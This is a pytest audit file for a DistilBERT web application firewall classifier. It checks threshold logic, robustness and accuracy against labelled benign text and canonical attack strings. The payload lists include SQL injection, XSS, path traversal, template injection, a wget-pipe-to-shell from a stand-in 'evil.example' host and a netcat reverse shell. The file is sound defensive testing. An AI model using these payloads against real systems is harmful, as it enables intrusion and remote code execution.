"""AUDIT - ml/waf/predictor.py with the REAL shipped v1 model (DistilBERT, 7 classes) at the shipped 0.8 threshold.

Part 1 pins the decision rules with injected scores (no model needed for the logic itself).
Part 2 asks the model what a WAF model must answer: canonical payloads of every class must block with the right
label, ordinary shell/HTML/log/config text must not.
"""
import threading
import time

import pytest

from ml.waf.predictor import WAFClassifier, WAFPrediction
from ml.waf.taxonomy import LABELS


# ---------------------------------------------------------------- decision rules (injected scores)
def _clf(scores, threshold=0.8):
    c = WAFClassifier(threshold=threshold)
    c._loaded, c._backend = True, "stub"
    c._score = lambda _t, s=scores: dict(s)
    return c


def test_unloaded_classifier_is_clean_and_says_so():
    p = WAFClassifier().predict("' OR 1=1--")
    assert (p.label, p.blocked, p.risk) == ("clean", False, "safe") and "not loaded" in p.note


@pytest.mark.parametrize("text", ["", "   ", "\n\t "])
def test_blank_input_is_clean_without_inference(text):
    c = _clf({"sqli": 1.0})
    c._score = lambda _t: (_ for _ in ()).throw(AssertionError("must not run inference on blank input"))
    assert not c.predict(text).blocked


def test_block_requires_an_attack_label_at_or_above_the_threshold():
    assert _clf({"clean": 0.1, "sqli": 0.8}).predict("x").blocked              # boundary is inclusive for softmax
    assert not _clf({"clean": 0.21, "sqli": 0.79}).predict("x").blocked
    assert not _clf({"clean": 0.95, "sqli": 0.05}).predict("x").blocked        # clean never blocks
    assert _clf({"clean": 0.0, "scanner": 0.99}).predict("x").label == "scanner"


def test_risk_level_comes_from_the_taxonomy():
    assert _clf({"sqli": 0.99}).predict("x").risk == "critical"
    assert _clf({"xss": 0.99}).predict("x").risk == "high"


def test_inference_exception_fails_open():
    c = _clf({})
    c._score = lambda _t: (_ for _ in ()).throw(RuntimeError("boom"))
    p = c.predict("' OR 1=1--")
    assert not p.blocked and "inference error" in p.note


def test_load_of_a_missing_or_corrupt_model_fails_open(tmp_path):
    assert WAFClassifier(model_path=str(tmp_path / "nope")).load() is False
    bad = tmp_path / "bad.joblib"
    bad.write_bytes(b"not a joblib file")
    assert WAFClassifier(model_path=str(bad)).load() is False
    assert not WAFClassifier(model_path=str(bad)).predict("' OR 1=1--").blocked


# ---------------------------------------------------------------- the real model
def test_real_model_loads_with_the_taxonomy_labels(waf):
    assert waf._backend == "transformer" and waf._labels == LABELS


def test_real_scores_are_a_probability_distribution_over_every_label(waf):
    p = waf.predict("' OR 1=1--")
    assert set(p.scores) == set(LABELS) and abs(sum(p.scores.values()) - 1.0) < 1e-4


def test_real_predictions_are_deterministic_and_stateless(waf):
    a = waf.predict("1' OR '1'='1")
    waf.predict("<script>alert(1)</script>")
    b = waf.predict("1' OR '1'='1")
    assert a.scores == b.scores


ODD_INPUTS = ["\x00", "\x00" * 50, "😀" * 200, "‮‭" * 20, "A" * 1_000_000, "'" * 100_000, "\ud800".encode("utf-8", "surrogatepass").decode("utf-8", "replace"),
              "\r\n" * 5000, "%" * 1000, "\\" * 5000, "<" * 5000, "ǅ" * 100, "a b c " * 50_000]


@pytest.mark.parametrize("text", ODD_INPUTS, ids=lambda s: f"{s[:6]!r}x{len(s)}")
def test_real_model_survives_odd_and_huge_input(waf, text):
    t0 = time.perf_counter()
    p = waf.predict(text)
    assert isinstance(p, WAFPrediction) and p.note == "" , p.note
    assert time.perf_counter() - t0 < 10


def test_real_model_is_thread_safe_and_consistent(waf):
    texts = ["' OR 1=1--", "<script>alert(1)</script>", "hello world", "; cat /etc/passwd"] * 6
    want = [waf.predict(t).label for t in texts]
    got = [None] * len(texts)

    def run(i):
        got[i] = waf.predict(texts[i]).label
    threads = [threading.Thread(target=run, args=(i,)) for i in range(len(texts))]
    [th.start() for th in threads]
    [th.join() for th in threads]
    assert got == want


def test_real_model_latency_on_short_input(waf):
    waf.predict("warm up")
    xs = []
    for _ in range(20):
        t0 = time.perf_counter()
        waf.predict("1' OR '1'='1' --")
        xs.append(time.perf_counter() - t0)
    xs.sort()
    assert xs[int(0.95 * len(xs)) - 1] < 1.0, f"p95 {xs[int(0.95 * len(xs)) - 1]:.2f}s"


# ---------------------------------------------------------------- what the model must answer
CANON = {
    "sqli": ["' OR '1'='1' --", "1' UNION SELECT username, password FROM users--", "admin'--", "1; DROP TABLE users--",
             "' OR 1=1#", "1' AND SLEEP(5)--", "1 UNION SELECT NULL,NULL,NULL--", "'; EXEC xp_cmdshell('dir')--"],
    "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(document.domain)>",
            "\"><script>alert(1)</script>", "javascript:alert(1)", "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>", "'-alert(1)-'"],
    "path_traversal": ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "....//....//etc/passwd",
                       "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "/etc/passwd%00.jpg", "php://filter/convert.base64-encode/resource=index.php",
                       "../../../../../../boot.ini", "file:///etc/passwd"],
    "command_injection": ["; cat /etc/passwd", "| whoami", "$(id)", "`uname -a`", "&& wget http://evil.example/x.sh -O- | sh",
                          "127.0.0.1; ls -la", "|| ping -c 10 127.0.0.1", "; nc -e /bin/sh 10.0.0.1 4444"],
    "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "{{config.items()}}", "{{''.__class__.__mro__[1].__subclasses__()}}",
             "#{7*7}", "{{request.application.__globals__}}", "${T(java.lang.Runtime).getRuntime().exec('id')}"],
    "scanner": ["sqlmap/1.7.2#stable (https://sqlmap.org)", "Nikto/2.1.6", "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:Port Check)",
                "DirBuster-1.0-RC1", "WPScan v3.8.24", "gobuster/3.5.0", "Acunetix-Aspect: enabled", "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"],
}


@pytest.mark.parametrize("label", sorted(CANON))
def test_real_model_blocks_canonical_payloads_of_each_class(waf, label):
    miss = [p for p in CANON[label] if not waf.predict(p).blocked]
    assert len(miss) <= len(CANON[label]) // 5, f"{label}: not blocked {len(miss)}/{len(CANON[label])}: {miss}"


@pytest.mark.parametrize("label", sorted(CANON))
def test_real_model_names_the_right_class_when_it_blocks(waf, label):
    wrong = [(p, waf.predict(p).label) for p in CANON[label] if waf.predict(p).blocked and waf.predict(p).label != label]
    assert len(wrong) <= len(CANON[label]) // 5, f"{label}: blocked under another class: {wrong}"


BENIGN = {
    "shell": ["ls -la /var/log | grep error", "git commit -m 'fix bug' && git push", "docker run -d -p 8080:80 nginx",
              "for f in *.txt; do echo $f; done", "tar -czf backup.tar.gz /home/user/docs", "cat README.md | head -20",
              "sudo systemctl restart nginx", "echo $PATH", "grep -r 'TODO' src/ | wc -l"],
    "html": ["<p>Hello <b>world</b></p>", '<a href="https://example.com/page">read more</a>', '<div class="card"><h2>Title</h2></div>',
             "<br>", "<ul><li>One</li><li>Two</li></ul>", '<img src="/logo.png" alt="Logo">'],
    "logs": ['127.0.0.1 - - [05/Nov/2026:10:00:01 +0000] "GET /index.html HTTP/1.1" 200 1043',
             "Nov  5 10:00:01 host sshd[1234]: Accepted publickey for alice from 10.0.0.5 port 52000 ssh2",
             "ERROR [main] com.app.Service: Connection refused: localhost:5432",
             "2026-11-05 10:00:01,123 INFO Started Application in 4.2 seconds"],
    "config": ["[server]\nlisten = 0.0.0.0:8080\nworkers = 4", '{"name":"demo","version":"1.0.0","private":true}',
               "key: value\nlist:\n  - a\n  - b", "DEBUG=false\nPORT=3000", "<configuration><appSettings/></configuration>"],
    "names and prose": ["O'Brien", "D'Angelo & Sons", "Select your plan: monthly or yearly", "Union Station, Washington DC",
                        "drop shadow effect", "order by date descending", 'He said "hello" and left', "5\" screen, 2\" bezel"],
    "code": ["function add(a, b) { return a + b; }", "const sql = 'SELECT * FROM t WHERE id = ?';", "if (x > 0 && y < 10) { run(); }",
             "def f(x):\n    return x ** 2", "SELECT id, name FROM customers WHERE country = 'DE' ORDER BY name"],
    "urls": ["https://example.com/search?q=shoes&sort=price", "https://example.com/a/b/c.html#section", "mailto:alice@example.com"],
}


@pytest.mark.parametrize("kind", sorted(BENIGN))
def test_real_model_leaves_ordinary_text_of_each_kind_alone(waf, kind):
    fp = [p for p in BENIGN[kind] if waf.predict(p).blocked]
    assert not fp, f"benign {kind} blocked ({len(fp)}/{len(BENIGN[kind])}): {[(p[:40], waf.predict(p).label) for p in fp]}"
